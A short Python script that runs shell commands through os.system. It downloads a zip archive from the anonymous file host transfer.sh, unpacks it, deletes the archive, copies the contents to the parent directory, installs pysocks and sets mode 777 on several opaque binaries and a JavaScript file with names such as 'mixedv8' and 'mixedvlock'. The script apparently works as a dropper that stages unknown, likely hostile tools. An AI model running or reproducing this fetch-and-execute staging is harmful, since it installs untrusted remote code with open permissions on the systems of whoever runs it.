import os

commands = """wget https://transfer.sh/D7Mwmt/mixeds.zip
unzip mixeds.zip
rm -rf mixeds.zip
cp * ../
pip install pysocks
chmod 777 mixedv8
chmod 777 mixedveta
chmod 777 mixedv13
chmod 777 mixedvlock
chmod 777 mixedv16.js
chmod 777 mixedv10"""

for i in commands.splitlines():
    os.system(i)